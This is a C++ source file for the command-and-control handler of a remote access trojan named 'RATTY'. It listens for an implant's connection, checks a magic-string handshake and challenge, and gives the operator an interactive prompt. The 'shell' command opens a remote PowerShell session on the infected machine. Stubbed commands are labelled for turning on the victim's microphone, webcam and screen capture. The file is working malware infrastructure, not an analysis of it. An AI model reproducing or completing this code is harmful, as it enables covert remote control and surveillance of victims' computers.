#include <rathandler.hpp>

Handler::Handler(std::string lhost, int lport): LHOST(lhost), LPORT(lport) {
    rat_conn = INVALID_SOCKET;
    InitializeServer();
    activeModule = nullptr;
}

void Handler::InitializeServer() {
    WSADATA wsaData;
    SOCKET sock_server;

    sockaddr_in address;
    int addrlen = sizeof(address);
    const int PORT = LPORT;

    // Initialize Winsock
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "[-] WSAStartup failed\n";
        return;
    }

    // Create socket
    sock_server = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock_server == INVALID_SOCKET) {
        std::cerr << "[-] Socket failed: " << WSAGetLastError() << "\n";
        WSACleanup();
        return;
    }

    // Bind
    address.sin_family = AF_INET;
    inet_pton(AF_INET, LHOST.c_str(), &address.sin_addr);
    address.sin_port = htons(PORT);

    if (bind(sock_server, (sockaddr*)&address, sizeof(address)) == SOCKET_ERROR) {
        std::cerr << "[-] Bind failed: " << WSAGetLastError() << "\n";
        closesocket(sock_server);
        WSACleanup();
        return;
    }

    // Listen
    if (listen(sock_server, SOMAXCONN) == SOCKET_ERROR) {
        std::cerr << "[-] Listen failed: " << WSAGetLastError() << "\n";
        closesocket(sock_server);
        WSACleanup();
        return;
    }

    std::cout << "Waiting for connection...\n";
    rat_conn = accept(sock_server, (sockaddr*)&address, &addrlen);
    if (rat_conn == INVALID_SOCKET) {
        std::cerr << "[-] Accept failed: " << WSAGetLastError() << "\n";
        closesocket(sock_server);
        WSACleanup();
        return;
    }

    std::cout << "[*] Incoming Connection. . ." << std::endl;
    Challenge();

    // enter user input mode
    Interact();
    NotifyClose();

    activeModule = nullptr;
    closesocket(rat_conn);
    closesocket(sock_server);
    WSACleanup();
}

std::string Handler::GenerateChallenge() {
    std::vector<int> nums;
    // A-Z
    for (int i = 65; i <= 91; ++i) nums.push_back(i);

    // shuffle reorders the elements in the given start|end range via RNG
    // std::mt19937 is a psuedo random RNG
    // std::random_device is a non-predictable RNG
    auto seed = std::random_device{}();
    auto rng = std::mt19937{seed};
    std::shuffle(nums.begin(), nums.end(), rng);

    std::string challenge;
    for (const int& num : nums) {
        challenge += (char)num;
    }
    return challenge;
}

bool Handler::Challenge() {
    if (rat_conn == INVALID_SOCKET) {
        std::cerr << "[-] Socket Connection not Valid!" << "\n";
        return false;
    }

    std::cout << "[*] Initiating Challenge. . ." << std::endl;

    std::pair<RatPacket,bool> recvPacket = RatPacketUtils::Recv(rat_conn);

    if (recvPacket.second) {
        std::cout << "[*] Recv Init Packet. . ." << std::endl;

        std::string msg = recvPacket.first.GetPacketMessage();

        if (msg == "imgettingratty" &&
            recvPacket.first.GetType() == MsgType::INIT &&
            recvPacket.first.Length() == msg.size()) {
            std::cout << "[*] Sending Challenge. . ." << std::endl;
            // send challenge
            std::string code = GenerateChallenge();

            RatPacketUtils::Send(rat_conn, RatPacket(code, MsgType::INIT));

            // recv challenge reply
            std::cout << "[*] Viewing Challenge Reply. . ." << std::endl;
            recvPacket = RatPacketUtils::Recv(rat_conn);
            if (recvPacket.second) {
                std::string replyCode = recvPacket.first.GetPacketMessage();
                std::cerr << "[*] Reply Code: " << replyCode << std::endl;

                if (replyCode == code) {
                    // notify rat were established
                    std::cout << "[+] Established RAT Connection!" << std::endl;
                    RatPacketUtils::Send(rat_conn, RatPacket("ratty", MsgType::INIT));
                    return true;
                }

                std::cerr << "[-] Invalid Reply Code! (" << replyCode << ")" << "\n";
                return false;
            }
            std::cerr << "[-] Recv no Data!" << "\n";
            return false;
        }
        std::cerr << "[-] Invalid Message! (" << msg << ")" << "\n";
        return false;
    }
    std::cerr << "[-] Recv no Data!" << "\n";
    return false;
}

void Handler::Interact() {
    if (rat_conn == INVALID_SOCKET) {
        std::cerr << "[-] Socket Connection not Valid!" << "\n";
        return;
    }

    std::string input;
    while (input != "exit") {
        printf("RATTY >$ ");
        std::getline(std::cin, input);
        
        if (!input.empty()) {
            ProcessCommand(input);

            if (activeModule != nullptr) {
                activeModule->execute(rat_conn);
                activeModule = nullptr;
            }
        }
    }
}

void Handler::ProcessCommand(const std::string& input) {
    if (input.empty() || input == "exit") return;

    if (input == "shell") {
        // enter interactive powershell session
        activeModule = &(ShellModule::getInstance());
    } else if (input == "mic_on") {
        // enable mic stream
    } else if (input == "mic_off") {
        // disable mic stream
    } else if (input == "camera_on") {
        // open a new window and display web-cam view
    } else if (input == "screen_view") {
        // open a new window and display screenshot frames
    } else {
        std::cout << input << ": RATTY command not found" << std::endl;
    }
}

void Handler::NotifyClose() {
    std::cout << "[*] Notifying RAT of closing. . .\n";
    RatPacketUtils::Send(rat_conn, RatPacket("closed", MsgType::NONE));
}